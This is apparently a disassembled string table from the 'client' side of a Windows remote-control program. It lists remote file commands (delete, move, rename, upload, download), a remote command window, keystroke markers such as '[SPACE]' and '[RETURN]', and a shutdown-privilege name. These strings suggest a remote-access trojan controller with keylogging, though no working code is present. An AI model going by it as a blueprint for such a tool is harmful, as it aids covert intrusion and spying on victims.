@_string.028D.client:
db	" ("
db	6 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.028E.client:
db	")"
db	7 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0294.client:
db	"Removable"
db	7 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0296.client:
db	"Fixed"
db	3 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0298.client:
db	"Remote"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.029A.client:
db	"CD-ROM"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.029C.client:
db	"Ram Disk"
db	8 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.029E.client:
db	"Not Root Dir"
db	4 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.029F.client:
db	"Unknown"
db	1 dup 0
;
dd 64, 0, 43, 0x80130001
@_string.02C7.client:
db	"error:getTreeCompLabel():: no label found: "
db	5 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.02DB.client:
db	"deldir "
db	1 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.02DC.client:
db	"|"
db	7 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.02E3.client:
db	"delallfiles "
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.02E4.client:
db	"*.*|"
db	4 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.02EB.client:
db	"delfile "
db	8 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.02F3.client:
db	"movefile "
db	7 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.02FB.client:
db	"newdir "
db	1 dup 0
;
dd 144, 0, 125, 0x80130001
@_string.0301.client:
db	"{",0x5C,"rtf1",0x5C,"ansi",0x5C,"deff0{",0x5C,"fonttbl{",0x5C,"f0",0x5C,"f"
db	"roman",0x5C,"fprq2",0x5C,"fcharset0 MS Sans Se"
db	"rif;}}{",0x5C,"colortbl ;",0x5C,"red100",0x5C,"green1"
db	"00",0x5C,"blue100;}",0x5C,"f0",0x5C,"cf1",0x5C,"fs20",0x5C,"b1  "
db	3 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.030E.client:
db	"[SPACE]"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.030F.client:
db	"[RETURN]"
db	8 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.032A.client:
db	"* "
db	6 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.0360.client:
db	"Remove from tree"
db	8 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.0362.client:
db	"Download file"
db	3 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0363.client:
db	"Refresh"
db	1 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0364.client:
db	"New folder"
db	6 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.0365.client:
db	"Rename file"
db	5 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.0366.client:
db	"Delete file"
db	5 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0367.client:
db	"Properties"
db	6 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.0369.client:
db	"Upload to folder"
db	8 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.036A.client:
db	"Delete folder"
db	3 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.036B.client:
db	"Rename folder"
db	3 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.036C.client:
db	"Delete all files"
db	8 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.036F.client:
db	"&Exit"
db	3 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0371.client:
db	"Open URL"
db	8 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.039E.client:
db	"//"
db	6 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.03D1.client:
db	"xscience"
db	8 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.03DA.client:
db	"cmdwnd"
db	2 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.03DC.client:
db	"cmd"
db	5 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.03E7.client:
db	"TaskbarCreated"
db	2 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.03E9.client:
db	"edit"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.03F7.client:
db	"main"
db	4 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.03FA.client:
db	"event"
db	3 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0400.client:
db	"stream"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.040C.client:
db	"button"
db	2 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.040D.client:
db	"remote file"
db	5 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0415.client:
db	"go"
db	6 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.041B.client:
db	"port"
db	4 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0425.client:
db	"save as"
db	1 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0429.client:
db	"browse"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.042E.client:
db	"compress"
db	8 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0433.client:
db	"encrypt"
db	1 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0438.client:
db	"adler crc"
db	7 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.043D.client:
db	"local file"
db	6 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0443.client:
db	"upload to"
db	7 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.044D.client:
db	"Arial"
db	3 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.04DB.client:
db	"/newdir "
db	8 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.04DD.client:
db	"Delete file:  ",0x0A
db	1 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.04DF.client:
db	"Confirm Delete"
db	2 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.04E4.client:
db	"Delete folder:  ",0x0A
db	7 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.04E5.client:
db	"/rename "
db	8 dup 0
;
dd 56, 0, 37, 0x80130001
@_string.04E6.client:
db	"Delete all files and folders from:  ",0x0A
db	3 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.04E8.client:
db	"fileinfo "
db	7 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.04E9.client:
db	"refresh "
db	8 dup 0
;
dd 40, 0, 21, 0x80130001
@_string.04FF.client:
db	"All Files (*.*)",0x00,"*.*",0x00,0x00
db	3 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0502.client:
db	"Save As"
db	1 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0519.client:
db	",0,0,"
db	3 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.0529.client:
db	"Upload File"
db	5 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0592.client:
db	"."
db	7 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.05D1.client:
db	"richedit20A"
db	5 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.05D3.client:
db	"riched20.dll"
db	4 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.05D4.client:
db	"richedit"
db	8 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.05D5.client:
db	"riched32.dll"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.05F6.client:
db	"open"
db	4 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.05FA.client:
db	".htm"
db	4 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.05FC.client:
db	0x5C,"shell",0x5C,"open",0x5C,"command"
db	5 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.05FF.client:
db	0x22,"%1",0x22
db	4 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0600.client:
db	"%1"
db	6 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0618.client:
db	";"
db	7 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.1B65.client:
db	"static"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.1BC8.client:
db	"listbox"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.1C33.client:
db	"combobox"
db	8 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.1C88.client:
db	"scrollbar"
db	7 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.1D53.client:
db	"mdiclient"
db	7 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.1FF7.client:
db	"SysHeader32"
db	5 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.2080.client:
db	"ToolbarWindow32"
db	1 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.21C4.client:
db	"ReBarWindow32"
db	3 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.2241.client:
db	"tooltips_class32"
db	8 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.2292.client:
db	"msctls_statusbar32"
db	6 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.22B4.client:
db	"msctls_trackbar32"
db	7 dup 0
;
dd 40, 0, 20, 0x80130001
@_string.2305.client:
db	"commctrl_DragListMsg"
db	4 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.2307.client:
db	"msctls_updown32"
db	1 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.2330.client:
db	"msctls_progress32"
db	7 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.234E.client:
db	"msctls_hotkey32"
db	1 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.235E.client:
db	"SysListView32"
db	3 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.24AB.client:
db	"SysTreeView32"
db	3 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.257A.client:
db	"ComboBoxEx32"
db	4 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.25B4.client:
db	"SysTabControl32"
db	1 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.261C.client:
db	"SysMonthCal32"
db	3 dup 0
;
dd 40, 0, 17, 0x80130001
@_string.266A.client:
db	"SysDateTimePick32"
db	7 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.26A0.client:
db	"NativeFontCtl"
db	3 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.26A8.client:
db	"SysPager"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.2734.client:
db	"RichEdit"
db	8 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.2737.client:
db	"RichEdit20A"
db	5 dup 0
;
dd 40, 0, 16, 0x80130001
@_string.2863.client:
db	"Rich Text Format"
db	8 dup 0
;
dd 56, 0, 32, 0x80130001
@_string.2865.client:
db	"Rich Text Format Without Objects"
db	8 dup 0
;
dd 48, 0, 25, 0x80130001
@_string.2867.client:
db	"RichEdit Text and Objects"
db	7 dup 0
;
dd 48, 0, 26, 0x80130001
@_string.29B0.client:
db	"commdlg_LBSelChangedNotify"
db	6 dup 0
;
dd 40, 0, 22, 0x80130001
@_string.29B2.client:
db	"commdlg_ShareViolation"
db	2 dup 0
;
dd 40, 0, 18, 0x80130001
@_string.29B4.client:
db	"commdlg_FileNameOK"
db	6 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.29B6.client:
db	"commdlg_ColorOK"
db	1 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.29B8.client:
db	"commdlg_SetRGBColor"
db	5 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.29BA.client:
db	"commdlg_help"
db	4 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.29BC.client:
db	"commdlg_FindReplace"
db	5 dup 0
;
dd 64, 0, 42, 0x80130001
@_string.2BA9.client:
db	"Microsoft Base Cryptographic Provider v1.0"
db	6 dup 0
;
dd 64, 0, 46, 0x80130001
@_string.2BAD.client:
db	"Microsoft Enhanced Cryptographic Provider v1.0"
db	2 dup 0
;
dd 64, 0, 46, 0x80130001
@_string.2BB1.client:
db	"Microsoft RSA Signature Cryptographic Provider"
db	2 dup 0
;
dd 64, 0, 45, 0x80130001
@_string.2BB5.client:
db	"Microsoft RSA SChannel Cryptographic Provider"
db	3 dup 0
;
dd 64, 0, 41, 0x80130001
@_string.2BB9.client:
db	"Microsoft Base DSS Cryptographic Provider"
db	7 dup 0
;
dd 80, 0, 60, 0x80130001
@_string.2BBD.client:
db	"Microsoft Base DSS and Diffie-Hellman Cryptographic Provider"
db	4 dup 0
;
dd 88, 0, 64, 0x80130001
@_string.2BC1.client:
db	"Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider"
db	8 dup 0
;
dd 64, 0, 44, 0x80130001
@_string.2BC5.client:
db	"Microsoft DH SChannel Cryptographic Provider"
db	4 dup 0
;
dd 64, 0, 41, 0x80130001
@_string.2BC9.client:
db	"Microsoft Base Smart Card Crypto Provider"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.2C5D.client:
db	"O"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.2C5F.client:
db	"G"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.2C61.client:
db	"D"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.2C63.client:
db	"S"
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.2C65.client:
db	"P"
db	7 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C67.client:
db	"AR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C69.client:
db	"AI"
db	6 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.2C6B.client:
db	"A"
db	7 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C6E.client:
db	"OA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C70.client:
db	"OD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C72.client:
db	"AU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C74.client:
db	"AL"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C76.client:
db	"OU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C78.client:
db	"OL"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C7A.client:
db	"CI"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C7C.client:
db	"OI"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C7E.client:
db	"NP"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C80.client:
db	"IO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C82.client:
db	"ID"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C84.client:
db	"SA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C86.client:
db	"FA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C88.client:
db	"RP"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C8A.client:
db	"WP"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C8C.client:
db	"CC"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C8E.client:
db	"DC"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C90.client:
db	"LC"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C92.client:
db	"SW"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C94.client:
db	"LO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C96.client:
db	"DT"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C98.client:
db	"CR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C9A.client:
db	"RC"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C9C.client:
db	"WD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2C9E.client:
db	"WO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CA0.client:
db	"SD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CA2.client:
db	"GA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CA4.client:
db	"GR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CA6.client:
db	"GW"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CA8.client:
db	"GX"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CAB.client:
db	"FR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CAD.client:
db	"FW"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CAF.client:
db	"FX"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CB1.client:
db	"KA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CB3.client:
db	"KR"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CB5.client:
db	"KW"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CB7.client:
db	"KX"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CBA.client:
db	"DA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CBC.client:
db	"DG"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CBE.client:
db	"DU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CC0.client:
db	"ED"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CC2.client:
db	"DD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CC5.client:
db	"BA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CC7.client:
db	"BG"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CC9.client:
db	"BU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CCB.client:
db	"LA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CCD.client:
db	"LG"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CCF.client:
db	"AO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CD1.client:
db	"BO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CD3.client:
db	"PO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CD5.client:
db	"SO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CD8.client:
db	"PS"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CDA.client:
db	"CO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CDC.client:
db	"CG"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CDE.client:
db	"SY"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CE0.client:
db	"PU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CE3.client:
db	"RE"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CE5.client:
db	"IU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CE7.client:
db	"NU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CE9.client:
db	"SU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CEC.client:
db	"AN"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CEF.client:
db	"CA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CF1.client:
db	"RS"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CF3.client:
db	"EA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CF5.client:
db	"PA"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CF7.client:
db	"RU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CF9.client:
db	"LS"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CFB.client:
db	"NS"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CFD.client:
db	"RD"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2CFF.client:
db	"NO"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2D01.client:
db	"MU"
db	6 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.2D03.client:
db	"LU"
db	6 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.2D0E.client:
db	"("
db	7 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.2D11.client:
db	"KaM"
db	5 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.2D1A.client:
db	"ijl15.dll"
db	7 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.2D1C.client:
db	"minip2p"
db	1 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.2D1E.client:
db	".dll"
db	4 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.2D2D.client:
db	"A",0x0D,"U",0x03,"T",0x03,"H",0x04
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.2D2E.client:
db	"12-_",0x5C,0x01,"34"
db	8 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.2D2F.client:
db	"tmpboc1"
db	1 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.2D31.client:
db	"win32.sys"
db	7 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.2D40.client:
db	"SeShutdownPrivilege"
db	5 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.StartLibrary.client:
db	"%_StartLibrary_"
db	1 dup 0
